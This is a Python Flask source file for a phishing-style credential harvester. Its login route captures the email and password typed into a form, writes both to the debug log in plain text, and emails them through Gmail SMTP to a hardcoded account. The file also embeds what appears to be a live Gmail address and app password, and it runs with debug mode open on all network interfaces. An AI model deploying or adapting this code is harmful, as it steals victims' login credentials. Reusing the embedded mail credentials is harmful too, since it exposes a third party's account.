from flask import Flask, render_template, request, redirect, url_for, flash
from flask_mail import Mail, Message
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Configure mail settings for Gmail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = 'dan.remus56@gmail.com'  # Your Gmail email address
app.config['MAIL_PASSWORD'] = 'galzpmulxdfisphu'  # Your Gmail password or App Password

mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']


    app.logger.debug(f'Received email: {email}')
    app.logger.debug(f'Received password: {password}')

    try:
        # Send email with login details to Gmail account
        msg = Message('Login Details', sender=app.config['MAIL_USERNAME'], recipients=[app.config['MAIL_USERNAME']])
        msg.body = f'Email: {email}\nPassword: {password}'
        mail.send(msg)
        flash('Login details sent successfully.', 'success')
    except Exception as e:
        flash(f'Failed to send email. Error: {str(e)}', 'error')

    return redirect(url_for('index'))

@app.route('/test_email')
def test_email():
    try:
        msg = Message('Test Email', sender=app.config['MAIL_USERNAME'], recipients=[app.config['MAIL_USERNAME']])
        msg.body = 'This is a test email.'
        mail.send(msg)
        app.logger.debug("Test email sent successfully.")
        return "Test email sent successfully."
    except Exception as e:
        app.logger.error(f"Failed to send test email. Error: {str(e)}")
        return f"Failed to send test email. Error: {str(e)}"




if __name__ == '__main__':
    # Only run the app if this script is executed directly
    app.run(host='0.0.0.0', port=8080, debug=True)
